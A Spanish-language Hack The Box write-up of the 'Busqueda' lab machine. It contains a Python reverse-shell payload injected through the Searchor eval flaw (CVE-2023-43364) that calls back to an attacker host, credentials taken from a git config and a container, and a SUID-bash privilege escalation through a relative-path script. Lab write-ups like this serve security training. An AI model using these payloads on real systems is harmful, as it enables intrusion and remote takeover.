---
title: "HTB - Busqueda"
Summary: "Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user&amp;#039;s Gitea account. Further analysis of the system checkup script&amp;#039;s source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges."
layoutBackgroundBlur: true
date: 2026-10-12
layoutBackgroundHeaderSpace: true
showhero: true
herostyle: "background"
tags: ["HackTheBox", "Linux"]
---

{{< machine-HTB name="Búsqueda" platform="Hack The Box" ip="10.129.228.217" os="Linux" difficulty="easy" >}}

## Spoiler
---

<style>
  .spoiler-toggle {
    position: absolute;
    opacity: 0;
    pointer-events: none;
  }

  .spoiler-text {
    cursor: pointer;
    filter: blur(6px);
    opacity: 0.35;
    transition: filter 0.2s ease, opacity 0.2s ease;
  }

  .spoiler-toggle:checked + .spoiler-text {
    filter: none;
    opacity: 1;
    user-select: text;
  }
</style>

Hint 1:
<input class="spoiler-toggle" type="checkbox" id="step-1">
<label class="spoiler-text" for="step-1">
  Vulnerabilidades por versión... lo típico
</label>

Hint 2:
<input class="spoiler-toggle" type="checkbox" id="step-2">
<label class="spoiler-text" for="step-2">
  Ya nadie guarda contraseñas en archivos no ?
</label>

Hint 3:
<input class="spoiler-toggle" type="checkbox" id="step-3">
<label class="spoiler-text" for="step-3">
  Siempre revisar puertos internos, tómate un te antes de eso
</label>

Hint 4:
<input class="spoiler-toggle" type="checkbox" id="step-4">
<label class="spoiler-text" for="step-4">
  Curso intensivo de inspección de docker, obtener datos no debe de ser tan dificil
</label>

Hint 5:
<input class="spoiler-toggle" type="checkbox" id="step-5">
<label class="spoiler-text" for="step-5">
  Reutilización de contraseñas, quien lo diría ? será para no olvidarse...
</label>

Hint 6:
<input class="spoiler-toggle" type="checkbox" id="step-6">
<label class="spoiler-text" for="step-6">
  Qué es peor que usar binarios con rutas relativas ? usar cosas que no sean binarios en rutas relativas :v
</label>

## Writeupp
---

### Reconocimiento

Primero se realizará el escaneo de puertos y servicios de la máquina utilizando la herramienta `nmap`

```sh
sudo nmap -sS -Pn -n --min-rate 5000 10.129.228.217 -p- -sV -vvv -oN port-scan
```

```rb
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Se disponen de 2 puertos, el 22 (SSH) y el puerrto 80 (HTTP), usualmente estas máquinas mantienen el vector de entrara por alguna vulnerabilidad web así que vamos por el puerto 80 primero.

Al colocar la ip de la máquina en el navegador nos redirige automáticamente al dominio *searcher.htb* por lo que añadiremos la siguiente cadena al */etc/hosts*

```plaintext
(...)
# HackTheBox
10.129.228.217 searcher.htb
```

Una vez realizado se podrá visualizar la página web

![alt text](image.png)

Esta manatiene una funcionalidad básica, tienes una sección para seleccionar un *engine* y otro para seleccionar lo que se desea buscar, un string cualquiera, un ejemplo de eso es por ejemplo seleccionar un navegador random (p.e. Bing) y colocar una palabra random (p.e. fluwh3n)

![alt text](image-1.png)

![alt text](image-2.png)

Si notamos un poco más abajo en la página web podemos ver lo que se usó para poder crear dicha página web

![alt text](image-3.png)

Se está utilizando *Searchor 2.4.0* para esta página, buscaremos si dispone de una vulnerabilidad.

Entre la búsqueda realizada encontramos que se tiene el *CVE-2023-43364* cuya descripción dice lo siguiente:

> [!quote]
> main.py in Searchor before 2.4.2 uses eval on CLI input, which may cause unexpected code execution.

Esta vulnerabilidad permite que se tenga una ejecución de código por lo cual nos aprovecharemos de esto para obtener acceso dentro del sistema a través de una shell reversa.

En resumen, esta existe debido a que no se sanitiza un parámetro del código, dicho parámetro incluso se encuentra dentro de una función `eval()` lo que permitiría poder colocar funciones internas para obtener una ejecución de código a través de ese `eval()`

Específicamente la función vulnerable es la siguiente:

```python3
url = eval( f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})" )
```

## Acceso Inicial

Para obtener una shell reversa utilizaremos el siguiente código el cual se puede encontrar en el repositorio https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-

```plaintext
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.15.231',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))%23
```

Esto lo colocaremos en el parámetro **query** utilizando `caido` y abriremos nuestro puerto 4444 con `nc`

![alt text](image-4.png)

Con eso obtenemos la shell reversa

![alt text](image-5.png)

Dentro de la máquina verificaremos que puertos abiertos tiene internamente con el comando `netstat ntlp`

![alt text](image-6.png)

Notamos que dispone de varios puertos, hay 2 en particular que saltan a la vista, el 5000 y el 3000, si realizamos un curl a dichos puertos obtendremos lo siguiente

- 5000
![alt text](image-7.png)

- 3000
![alt text](image-8.png)

Notamos que la página que vimos al inicio del reconocimiento está ejecutando en el puerto 5000, mientras que en el puerto 3000 se está ejecutando *gitea* 

Si leemos el archivo interno */etc/hosts* podemos ver bajo qué subdominio se está ejecutando 

```plaintext
svc@busqueda:/tmp$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 busqueda searcher.htb gitea.searcher.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Agregamos el string *gitea.searcher.htb* a nuestro */etc/hosts*, luego de eso podemos visualizar el gitea

![alt text](image-9.png)

Ahora, no tenemos un usuario, ni tampoco hay repositorios "públicos", entonces buscaremos dentro de la máquina a ver si encontramos algo que nos pueda guiar

Dentro de la ruta */var/www/app/.git/config* podemos encontrar la creencial de gitea del usuario *cody*

```plaintext
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

Utilizaremos eso para ingresar al gitea de la máquina

Una vez logueado podremos visualizar repositorios del usuario

![alt text](image-10.png)

Esto tampoco es que sea de gran ayuda...

Ahora verificaremos si dicha contraseña le pertenece al usuario *svc* (usuario del que tenemos acceso actualmente)

![alt text](image-11.png)

Perfecto, con esto sabemos la password del usuario y no solo eso, tambien tenemos que puede ejecutar un comando como sudo, veremos como aprovecharnos de eso

En primero lugar, no nos dejan leer dicho archivo

```sh
svc@busqueda:/var/www/app/.git$ cat /opt/scripts/system-checkup.py
cat: /opt/scripts/system-checkup.py: Permission denied
```

Entonces colocaremos cualquier cosa a ver qué nos responde

```sh
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py a
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Ahora vemos otra cosa, tal parece que son comandos de docker para visualizar los contenedores, un comando interesante es el `docker-inspcet` el cual permite obtener varias variables de un contenedor, lo usaremos para poder obtener mayor información.

Primero enumeraremos los contenedores

```sh
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES             
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 years ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea             
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Tenemos 2, veremos los datos del docker del mysql

```sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' f84a6b33fb5a
```

![alt text](image-12.png)

Tal como se muestra en lo resaltado con rojo, hay una password, esta la utilizaremos para ingresar con el usuario administrador en *gitea*

Una vez ingresaro como administrador podremos ver otro repositorio, esta vez del usuario administrador

![alt text](image-13.png)

Estos parecen ser los que se encuentran dentro de la carpeta */opt/scripts*

![alt text](image-14.png)

```sh
svc@busqueda:/opt/scripts$ ls -li
total 16
43428 -rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
43447 -rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
43536 -rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
43251 -rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py
```

Especificamente el archivo `system-checkup.py` contiene el código que nos permitian ejecutar como sudo

![alt text](image-15.png)

Sin embargo, ese código tiene una vulnerabilidad, específicamente en la siguiente porción de código:

```python3
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

Enlos otros comandos llamaba a una función de docker del sistema, pero este llama a un archivo llamado *full-checkup.sh*, incluso lo llama desde la carpeta actual de donse se ejecuta el comando, entonces podremos crear un archivo con ese nombre y colocar código malicioso en ella

## Elevación de privilegios

Crearemos un archivo llamado *full-checkup.sh* cuyo conttenido será el siguiente:

```sh
#!/bin/sh

chmod u+s /bin/bash
```

Luego le daremos permisos de ejecución

```sh
chmod +x full-checkup.sh
```

Ahora ejecutaremos el comando de sudo

```sh
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
```

Revisaremos si se llegó a aplicar el cambio dentro del binario bash

```sh
svc@busqueda:/tmp$ ls -li /bin/bash
516 -rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Luego de verificar el cambio lo utilizaremos para obtener permisos de sudo

```sh
svc@busqueda:/tmp$ bash -p
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
```

Con esto elevamos nuestro privilegio dentro de la máquina :)